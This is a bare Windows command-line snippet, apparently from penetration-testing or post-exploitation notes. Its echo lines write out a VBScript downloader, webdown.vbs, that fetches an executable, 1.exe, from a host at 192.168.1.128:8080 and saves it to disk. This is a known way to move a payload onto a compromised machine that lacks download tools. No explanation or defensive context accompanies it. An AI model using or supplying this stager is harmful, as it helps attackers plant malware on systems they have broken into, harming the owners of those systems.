echo Set xPost = CreateObject("Microsoft.XMLHTTP") >webdown.vbs
echo xPost.Open "GET","http://192.168.1.128:8080/1.exe",0 >>webdown.vbs
echo xPost.Send() >>webdown.vbs
echo Set sGet = CreateObject("ADODB.Stream") >>webdown.vbs
echo sGet.Mode = 3 >>webdown.vbs
echo sGet.Type = 1 >>webdown.vbs
echo sGet.Open() >>webdown.vbs
echo sGet.Write(xPost.responseBody) >>webdown.vbs
echo sGet.SaveToFile "1.exe",2 >>webdown.vbs